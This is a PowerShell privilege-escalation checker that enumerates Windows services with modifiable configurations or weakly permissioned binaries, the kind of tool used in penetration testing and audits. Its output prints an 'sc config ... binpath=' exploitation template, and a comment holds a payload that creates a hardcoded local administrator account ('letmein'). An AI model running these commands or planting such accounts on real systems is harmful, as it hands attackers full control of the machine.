<#
    CheckServices aims to highlight common Windows privilege escalation
    vectors that rely on misconfigurations on FILES and SERVICES permissions.
    This script does not use sc.exe to find misconfigurations.

    Author: @xtr4nge
    License: GPLv3 [http://www.gnu.org/licenses/]
    Required Dependencies: None
    Optional Dependencies: None
#>

function Invoke-CheckServices() {
    # REF: https://blogs.msdn.microsoft.com/sergey_babkins_blog/2015/02/27/security-descriptors-part-2-principals-sids-and-powershell/
    # REF: http://www.lewisroberts.com/2010/09/16/getting-started-with-sddl/
    
    $a_config = @()
    $a_acl_error = @()
    
    $user = "letmein"
    $pass = "Pa55word!"
    
    $cuser = $env:USERNAME
    
    $services = get-wmiobject -query "select * from win32_service"
    
    Write-Output "SERVICE ACL [FILE]"
    Write-Output "---------------------------"
    
    foreach ($service in $services) {
        $x = $service.GetSecurityDescriptor()
        $s_name = $service.Name
        $s_pathname = $service.Pathname
        try {
            Set-Service -Name "$s_name" -ErrorAction Stop
            $a_config += $s_name
        } 
        catch 
        {
            #Write-Output "not allowed"
            #Write-Output $_.Exception
        }
        
        try {
            if ($s_pathname -notlike "*svchost.exe*") {
                $s_pathname_clean = $s_pathname.Replace('"',"")
                $value = Get-Acl "$s_pathname_clean" -ErrorAction Stop | select -expandproperty access
                $s_flag = $true
    
                foreach ($item in $value) {
                    $item_ir = $item.IdentityReference
                    $item_fsr = $item.FileSystemRights
                    if ($item_ir -match "$cuser|every" -And $item_fsr -match "write|full") {
                        if ($s_flag) {
                            Write-Output "NAME: $s_name"
                            Write-Output "PATH: $s_pathname_clean"
                            $s_flag = $false
                        }
                        Write-Output "USER: $item_ir"
                        Write-Output "ACL: $item_fsr"
                        Write-Output ""
                    }
                }
            }
        } 
        catch 
        {
            $a_acl_error += $s_pathname_clean
        }
    }
    
    Write-Output "VULNERABLE SERVICE [CONFIG]"
    Write-Output "---------------------------"
    foreach ($item in $a_config) {
        Write-Output "NAME: $item"
        Write-Output "EXEC: sc config $item binpath= _COMMAND_ & sc start $item" #net user /add $user $pass & net localgroup administrators $user /add
        Write-Output ""
    }
    Write-Output "NOTE: Use PowerUp.ps1 to find other misconfigurations."
}

Invoke-CheckServices
